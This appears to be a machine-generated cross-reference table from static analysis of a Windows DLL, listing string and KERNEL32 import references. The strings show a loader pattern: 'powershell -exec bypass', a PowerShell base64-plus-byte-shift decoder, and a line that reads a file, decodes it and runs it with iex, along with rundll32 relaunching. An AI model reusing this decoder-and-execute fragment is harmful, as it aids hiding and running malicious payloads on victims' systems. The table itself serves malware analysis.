reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x1000109a	0x10014c70	string	0x10001090	bad array new length
0x10001150	0x10014c88	string	0x10001150	string too long
0x100011d8	0x10010008	import	0x10001160	KERNEL32.dll.GetModuleFileNameW
0x100015df	0x1001000c	import	0x10001590	KERNEL32.dll.CreatePipe
0x1000160a	0x10010000	import	0x10001590	KERNEL32.dll.GetCurrentProcess
0x10001622	0x10010014	import	0x10001590	KERNEL32.dll.DuplicateHandle
0x1000174e	0x10014ca0	string	0x10001590	powershell -exec bypass
0x10001801	0x1001002c	import	0x10001590	KERNEL32.dll.CreateProcessA
0x10001817	0x10010010	import	0x10001590	KERNEL32.dll.WaitForSingleObject
0x100018ef	0x10010004	import	0x10001590	KERNEL32.dll.WriteFile
0x1000199d	0x10010010	import	0x10001590	KERNEL32.dll.WaitForSingleObject
0x100019a6	0x1001001c	import	0x10001590	KERNEL32.dll.CloseHandle
0x10001ab0	0x10014d08	string	0x10001a20	function bdec($in){$out = [System.Convert]::FromBase64String($in);return [System.Text.Encoding]::UTF8.GetString($out);}function bDec2($szinput){$in = [System.Text.Encoding]::UTF8.GetBytes($szinput);for ($i=0; $i -le $in.count -1; $i++){$in[$i] = $in[$i] - 2;}return [System.Text.Encoding]::UTF8.GetString($in);}function bDd($in){$dec = bdec $in;$temp = bDec2 $dec;return $temp;}
0x10001bba	0x10015000	string	0x10001a20	$a=get-content
0x10001c78	0x10014cdc	string	0x10001a20	;$t =bDd $a;iex($t);
0x10001e87	0x10010024	import	0x10001e40	KERNEL32.dll.GetModuleHandleW
0x10001e9a	0x10010008	import	0x10001e40	KERNEL32.dll.GetModuleFileNameW
0x10001fd0	0x10015020	string	0x10001e40	rundll32.exe
0x10002018	0x10010008	import	0x10001e40	KERNEL32.dll.GetModuleFileNameW
0x1000208f	0x10015064	string	0x10001e40	Rundll32.exe
0x10002096	0x10015064	string	0x10001e40	Rundll32.exe
0x100020b2	0x10015064	string	0x10001e40	Rundll32.exe
0x100020d6	0x10015064	string	0x10001e40	Rundll32.exe
0x10002161	0x1001503c	string	0x10001e40	,DllRegisterServer
0x100022e2	0x10010020	import	0x10001e40	KERNEL32.dll.CreateProcessW
0x100022f1	0x10010018	import	0x10001e40	KERNEL32.dll.Sleep
0x100022fd	0x1001001c	import	0x10001e40	KERNEL32.dll.CloseHandle
0x10002add	0x10015064	string	0x10002a10	Rundll32.exe
0x10002d0a	0x10010178	string	0x10002d00	bad allocation
0x10002f6b	0x100035df	string	0x10002eb4	j\bh X
0x100031c9	0x10010038	import	0x100031c4	KERNEL32.dll.SetUnhandledExceptionFilter
0x100031d2	0x10010034	import	0x100031c4	KERNEL32.dll.UnhandledExceptionFilter
0x100031dd	0x10010000	import	0x100031c4	KERNEL32.dll.GetCurrentProcess
0x100031e4	0x1001003c	import	0x100031c4	KERNEL32.dll.TerminateProcess
0x10003319	0x10010050	import	0x10003302	KERNEL32.dll.GetSystemTimeAsFileTime
0x10003328	0x1001004c	import	0x10003302	KERNEL32.dll.GetCurrentThreadId
0x10003331	0x10010048	import	0x10003302	KERNEL32.dll.GetCurrentProcessId
0x1000333e	0x10010044	import	0x10003302	KERNEL32.dll.QueryPerformanceCounter
0x100033a4	0x10010054	import	0x1000339f	KERNEL32.dll.InitializeSListHead
0x10003795	0x10010058	import	0x100036be	KERNEL32.dll.IsDebuggerPresent
0x100037b5	0x10010038	import	0x100036be	KERNEL32.dll.SetUnhandledExceptionFilter
0x100037bf	0x10010034	import	0x100036be	KERNEL32.dll.UnhandledExceptionFilter
0x100039cc	0x10003a65	string	0x1000389c	_^[3
0x100039ea	0x10003a65	string	0x1000389c	_^[3
0x100039f2	0x10003a65	string	0x1000389c	_^[3
0x10003a0c	0x10003a65	string	0x1000389c	_^[3
0x10003a28	0x10003a65	string	0x1000389c	_^[3
0x10003a45	0x10003a65	string	0x1000389c	_^[3
0x10003a56	0x10003a65	string	0x1000389c	_^[3
0x10003c84	0x10010060	import	0x10003c60	KERNEL32.dll.RtlUnwind
0x10003db1	0x10003dbe	string	0x10003d50	jjjjj
0x100040ac	0x10010064	import	0x1000404c	KERNEL32.dll.RaiseException
0x10004182	0x100054a0	string	0x10004100	UVWS
0x100042a0	0x10010068	import	0x1000429a	KERNEL32.dll.InterlockedFlushSList
0x100044e8	0x1001006c	import	0x100044da	KERNEL32.dll.GetLastError
0x10004561	0x10010070	import	0x100044da	KERNEL32.dll.SetLastError
0x100047ab	0x100046f8	string	0x10004791	j\bh(Y
0x10004803	0x1000480c	string	0x10004791	_^[]
0x10004ac6	0x10003ea5	string	0x10004811	j\bh@X
0x10004bec	0x10010074	import	0x10004bc7	KERNEL32.dll.EncodePointer
0x10004ddc	0x10004e04	string	0x10004d8b	9q\fu
0x10004eb2	0x100101d0	string	0x10004ea8	bad exception
0x1000509b	0x10003ea5	string	0x10005027	j\bh@X
0x100054dd	0x100054e9	string	0x100054d4	_^[]Ë blocks=Basic Latin,Latin-1 Supplement
0x100054e3	0x10010060	import	0x100054d4	KERNEL32.dll.RtlUnwind
0x10005559	0x10010080	import	0x10005543	KERNEL32.dll.DeleteCriticalSection
0x1000557c	0x100055ed	string	0x10005572	;}\fu
0x100055a6	0x100100a0	import	0x10005572	KERNEL32.dll.LoadLibraryExW
0x100055b2	0x1001006c	import	0x10005572	KERNEL32.dll.GetLastError
0x100055c2	0x10010c18	string	0x10005572	api-ms-
0x100055d9	0x100100a0	import	0x10005572	KERNEL32.dll.LoadLibraryExW
0x1000563d	0x1001009c	import	0x1000560c	KERNEL32.dll.GetProcAddress
0x10005659	0x10010c30	string	0x10005655	FlsAlloc
0x10005663	0x10010c30	string	0x10005655	FlsAlloc
0x10005694	0x10010c44	string	0x10005690	FlsFree
0x1000569e	0x10010c44	string	0x10005690	FlsFree
0x100056c2	0x10010094	import	0x10005690	KERNEL32.dll.TlsFree
0x100056cf	0x10010c54	string	0x100056cb	FlsGetValue
0x100056d9	0x10010c54	string	0x100056cb	FlsGetValue
0x100056fd	0x1001008c	import	0x100056cb	KERNEL32.dll.TlsGetValue
0x1000570a	0x10010c68	string	0x10005706	FlsSetValue
0x10005714	0x10010c68	string	0x10005706	FlsSetValue
0x1000573b	0x10010090	import	0x10005706	KERNEL32.dll.TlsSetValue
0x10005748	0x10010c7c	string	0x10005744	InitializeCriticalSectionEx
0x10005752	0x10010c7c	string	0x10005744	InitializeCriticalSectionEx
0x10005782	0x10010084	import	0x10005744	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
